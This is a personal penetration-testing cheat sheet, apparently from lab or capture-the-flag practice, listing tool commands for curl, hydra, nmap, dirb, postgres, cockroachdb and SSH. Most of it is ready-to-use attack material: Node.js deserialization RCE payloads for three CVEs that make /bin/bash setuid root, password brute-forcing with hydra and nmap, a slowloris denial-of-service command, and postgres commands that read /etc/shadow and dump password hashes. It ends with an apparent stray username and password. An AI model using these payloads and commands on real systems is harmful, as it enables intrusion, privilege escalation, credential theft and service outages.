-uCURL NOTES

1.	curl -u username:password <url with http and uri>  # for basic auth
2.	curl --digest -u username:password <url> # for md5 digest auth
3. 	curl -i/-I for only headers
4.	curl -s for silent op
5.	curl -c <filename> for curl to write and use cookies from the filename
6.	sometimes if resource is not availabe using GET then try POST
eg : curl http://ip:port/flag  RESPONSE : /flag not found
	 curl -x POST http://ip:port/flag RESPONSE : Flag found : xkksnnxlj..


HYDRA Notes

hydra -L <Usernames file> -P <Passwords files> <server ip> <method> <uri> # -l for single uname -p for single passwd
eg 
hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/password.lst 192.248.195.3 http-get /Admin

for mysql

hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/password.lst 192.248.195.3 mysql

-f is for stop on correct login

GREP Notes

grep -q -i # quite igonre case
grep --color=always -e

BASH Notes

1.	while loop

while read var; do
echo $var
done < <file_from_which_to_read_vars>

2.	if 
	if <condn> ; then
	<do action>
	else
	<do action>
	fi

DIRB NOTES

Sometimes to use dirb we need to remove '\' from the dir list

sed -i 's/\///g' /usr/share/metasploit-framework/data/wordlists/directory.txt 
dirb http://192.81.185.3:3000  /usr/share/metasploit-framework/data/wordlists/directory.txt 


NMAP Notes

-sV Version info of services
-sC Default Script
Using Script Args 
nmap --script=mysql-users --script-args="mysqluser='root',mysqlpass=''"


DOS Notes

slowloris : DOS ATTACK

slowloris -p 80 -s 100 ip # p port s sockets increase s for better dos	

NODE-JS

webserver runs on usual port 80/443 but sometimes the debugger is exposed on port 9229/others

run tmux
access debugger using  node-inspect ip:port
you will get debug prompt
now access the webapp on port 80 in different tmux tab
the app can be dubbed and source read using node debug cmds in the debug prompt

JWT TOKEN DECODE : BASH

echo <jwt-token> | jwt -d

NODE JS DESERIALIZATION VULN : CVE-2017-5941

exploit jsoncode to set the setuid bit on /bin/bash

json={"run":"_$$ND_FUNC$$_function(){require('child_process').exec('chmod %2bs /bin/bash',function(error,stdout,stderr){console.log(stdout)});}()"}

send it to vulnerable NodeJS Server

curl -d @data.json -X POST  http://ip:port/uri  # where data.json contains above exploit jsoncode

now check /bin/bash . It should have setuid bit set. 

#bash -p
#whoami    # should show euid as root
# ls -la /root


CVE-2017-5954 : similar to above

in exploit code instead of require we use process.mainModule.constructor._load

json={"data": "(function() {process.mainModule.constructor._load('child_process').exec('chmod 4755 /bin/bash',function(error, stdout, stderr) {console.log(stdout)});})();"}

CVE-2013-4660

json={"data": "!!js/function > \n(function(){process.mainModule.constructor._load('child_process').exec('chmod 4755 /bin/bash',function(error, stdout, stderr) {console.log(stdout)}); })();"}




POST-GRESQL

psql -u postgres -h 192.48.203.3
psql -U postgres -h 192.48.203.3 -V # version info OR psql -U postgres -h 192.48.203.3 -c "SELECT VERSION();"  # -c is for cmd to be run
psql -U postgres -h 192.48.203.3 -c "\l" # list databases
psql -U postgres -h 192.48.203.3 -c "CREATE USER hacker2;" # create a db user

# To read from a file on remote server there are two options "
psql -U postgres -h 192.48.203.3 -c "CREATE TEMP TABLE aaabbb (INPUT TEXT) ;" -c " COPY aaabbb FROM '/etc/shadow' ; " -c " SELECT * FROM aaabbb ; " 
psql -U postgres -h 192.48.203.3 -f read_s.txt # where read_s.txt contains the above three mysql commands;

# show db users and their hashes
psql -U postgres -h 192.48.203.3 -c "SELECT * FROM pg_shadow;"

psql# \du # show users and their roles

psql# \! # interactive cmd shell
psql# \c employee postgres  # connect dbname uname

                                   

COCKROACHSQLDB

cockroach sql --insecure --host=192.108.133.3:26257  # connect to cockroachdb server

cockroach node status --insecure --host=192.108.133.3:26257 # get details of all nodes

cockroach sql --insecure --host=192.108.133.3:26257 -e "SHOW DATABASES;" # get list of databases;
cockroach sql --insecure --host=192.108.133.3:26257 -e "USE secret;" -e"SHOW TABLES;" # get tables of secret database;

cockroach sql --insecure --host=192.108.133.3:26257 -e "USE secret;" -e"show create secret.public.user;" # show the create statement used to create the table user

cockroach sql --insecure --host=192.108.133.3:26257 -e "USE secret;" -e"select * from secret.public.user;" # show all rows of user table in secret database. public is the schema

cockroach sql --insecure --host=192.108.133.3:26257 -e "show schemas;"


show grants on database secret; # List all the users who have the privilege to access "secret" database.

SSH

to run a cmd after connecting to ssh
ssh -q user@jh2i.com -p 50035 cat flag.txt

nmap -p 22 --script=ssh-run --script-args="ssh-run.cmd=cat /home/student/FLAG, ssh-run.username=student, ssh-run.password=marisol" 192.105.8.3
hydra -l student -P wordlists/100-common-passwords.txt 192.105.8.3 ssh -f
ssh -v root@192.105.8.3 # V FOR ALL DEBUG INFO
ssh-keyscan -t rsa 192.105.8.3 # FIND KEY OF SERVER
â€‹nmap --script ssh-hostkey --script-args ssh_hostkey=full 192.201.39.3  # FIND KEY OF SERVER
ssh -G root@192.105.8.3 # Show verbose info and quit
nmap --script ssh2-enum-algos 192.201.39.3 # check for all supported algos
nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=student" 192.201.39.3  # supported auth methods
nmap -p 22 --script ssh-brute --script-args="userdb=users.lst,passdb=/usr/share/nmap/nselib/data/passwords.lst,ssh-brute.timeout=4s" 192.132.80.3
hydra -l student -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt -t 4 192.132.80.3 ssh -f

JQ - JSON QUERY 

https://programminghistorian.org/en/lessons/json-and-jq

UNPACKING WIN EXE EXECUTABLES
upx -d <file.exe>

johncash92
qwer_1234




























































